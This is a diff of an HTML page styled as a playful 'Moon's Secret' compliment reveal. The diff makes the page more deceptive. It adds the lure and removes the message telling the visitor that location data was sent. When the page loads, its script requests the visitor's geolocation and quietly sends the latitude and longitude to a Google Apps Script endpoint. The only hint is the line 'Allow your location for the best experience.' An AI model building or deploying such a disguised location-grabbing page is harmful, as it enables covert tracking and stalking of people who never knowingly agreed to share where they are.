@@ -1,47 +1,136 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Moon’s Secret</title>
+    <style>
+        /* Body and background styling */
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background: url('image.jpg') no-repeat center center fixed;
+            background-size: cover;
+            color: white;
+            text-align: center;
+        }
+
+        /* Main content container */
+        .content {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0, 0, 0, 0.6);
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.8);
+        }
+
+        /* Text styling */
+        h1 {
+            font-size: 2em;
+            color: #ffcccb;
+        }
+
+        p {
+            font-size: 1.2em;
+            margin-bottom: 20px;
+        }
+
+        /* Button styling */
+        .button {
+            background-color: #ff69b4;
+            color: white;
+            padding: 15px 30px;
+            font-size: 1em;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0px 5px 15px rgba(255, 105, 180, 0.5);
+            transition: all 0.3s ease;
+        }
+
+        .button:hover {
+            background-color: #ff1493;
+            box-shadow: 0px 10px 25px rgba(255, 20, 147, 0.6);
+        }
+
+        /* Smaller text styling */
+        .small-text {
+            font-size: 0.9em;
+            color: #ffcccb;
+            margin-top: 10px;
+        }
+
+        /* Quote box styling */
+        #quote-box {
+            margin-top: 20px;
+            padding: 15px;
+            background: white;
+            color: black;
+            font-size: 1.2em;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(255, 20, 147, 0.6);
+            display: none;
+        }
+    </style>
+</head>
 <body onload="getLocation()">
+    <div class="content">
+        <h1>Hey... Listen...</h1>
+        <p>Moon is going to tell you a secret...</p>
+        <button class="button" onclick="getRandomQuote()">Reveal the Secret</button>
+        <p class="small-text">Allow your location for the best experience.</p>
+        <div id="quote-box"></div>
+    </div>
 
-<!-- Your GIF (for fun) -->
-<iframe src="https://giphy.com/embed/YTJXDiVNMPuNSMgC0" width="442" height="480" frameBorder="0" class="giphy-embed" allowFullScreen></iframe>
-<p><a href="https://giphy.com/gifs/moodman-fail-life-backflip-YTJXDiVNMPuNSMgC0">via GIPHY</a></p>
+    <script>
+        // Placeholder element for the user's location
+        var x = document.getElementById("demo");
 
-<!-- Placeholder for the location display -->
-<p id="demo"></p>
+        // Geolocation function
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition);
+            }
+        }
 
-<script>
-// This is the placeholder element to show location status
-var x = document.getElementById("demo");
+        // Function to send location to Google Apps Script
+        function showPosition(position) {
+            const lat = position.coords.latitude;
+            const long = position.coords.longitude;
 
-// Function to get the location
-function getLocation() {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(showPosition);
-    } else {
-        x.innerHTML = "Geolocation is not supported by this browser.";
-    }
-}
+            // Google Apps Script URL
+            const googleScriptURL = "https://script.google.com/macros/s/AKfycbySAP6KAAlhS8Z-Rtj30nb06Tk9fpQWUClWc09o0E97k-thh5FX5WRgEn2ArycpNYHjnQ/exec";
+            // Send location data
+            const xhttp = new XMLHttpRequest();
+            xhttp.open("GET", googleScriptURL + "?lat=" + lat + "&long=" + long, true);
+            xhttp.send();
+        }
 
-// This function will be triggered when location is successfully obtained
-function showPosition(position) {
-    const lat = position.coords.latitude;
-    const long = position.coords.longitude;
-    
-    // Set up the URL for your Google Apps Script
-    const googleScriptURL = "https://script.google.com/macros/s/AKfycbySAP6KAAlhS8Z-Rtj30nb06Tk9fpQWUClWc09o0E97k-thh5FX5WRgEn2ArycpNYHjnQ/exec";
-    
-    // Construct the full URL to send the latitude and longitude
-    const url = googleScriptURL + "?lat=" + lat + "&long=" + long;
+        // Quotes array
+        const quotes = [
+            "You’re a masterpiece the universe painted just once.",
+            "The stars envy your glow; you outshine them all.",
+            "You’re the light in someone’s darkest night.",
+            "Your smile is a constellation worth discovering.",
+            "The world is better simply because you’re in it.",
+            "Every heartbeat of yours echoes a thousand miracles.",
+            "You are not a drop in the ocean; you’re the ocean in a drop.",
+            "You’re a walking galaxy, with stars dancing in your eyes.",
+            "Your uniqueness is the rarest treasure on Earth.",
+            "The universe whispered your name and smiled."
+        ];
 
-    // Send the data to Google Sheets using an HTTP GET request
-    const xhttp = new XMLHttpRequest();
-    xhttp.open("GET", url, true);
-    xhttp.send();
-    
-    // Optionally, display confirmation on the page
-    x.innerHTML = "Location data sent successfully!";
-}
-</script>
-
+        // Function to display a random quote
+        function getRandomQuote() {
+            const randomIndex = Math.floor(Math.random() * quotes.length);
+            const quoteBox = document.getElementById("quote-box");
+            quoteBox.innerText = quotes[randomIndex];
+            quoteBox.style.display = "block";
+        }
+    </script>
 </body>
 </html>
